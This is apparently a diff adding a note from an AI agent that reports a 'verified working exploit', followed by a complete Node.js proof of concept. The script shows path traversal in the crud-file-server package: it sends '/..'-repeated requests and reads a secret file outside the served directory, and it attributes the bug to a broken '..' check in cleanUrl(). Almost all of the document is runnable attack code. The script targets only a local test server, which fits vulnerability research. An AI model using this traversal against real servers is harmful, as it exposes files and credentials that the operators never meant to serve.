@@ -1,0 +1,45 @@
+Cleanup confirmed (those deletions are pre-existing repo state, unrelated to my scratch files). Verified working exploit:
+
+```javascript
+const http = require("http");
+const path = require("path");
+const fs = require("fs");
+const crud = require("crud-file-server");
+
+// Directory that is intentionally served over HTTP
+const servedDir = path.join(__dirname, "public");
+if (!fs.existsSync(servedDir)) fs.mkdirSync(servedDir);
+
+// Secret file living OUTSIDE the served directory
+const secretPath = path.join(__dirname, "secret.txt");
+const secretData = "TOP-SECRET-" + Date.now();
+fs.writeFileSync(secretPath, secretData);
+
+const server = http.createServer((req, res) => {
+  crud.handleRequest(null, servedDir, req, res, true, false);
+});
+
+server.listen(0, () => {
+  const port = server.address().port;
+
+  // crud-file-server's cleanUrl() does `url.indexOf('..').length > 0`,
+  // which is always false (Number has no .length), so ".." is never
+  // stripped from the URL before it reaches fs.readFile() -> path traversal.
+  const traversal = "/..".repeat(30) + secretPath;
+
+  http.get({ host: "127.0.0.1", port, path: encodeURI(traversal) }, (res2) => {
+    let body = "";
+    res2.on("data", (c) => (body += c));
+    res2.on("end", () => {
+      console.log("Response:", body);
+      console.log(
+        body.includes(secretData)
+          ? "VULNERABLE: path traversal read file outside served directory"
+          : "not vulnerable"
+      );
+      server.close();
+      fs.unlinkSync(secretPath);
+    });
+  });
+});
+```
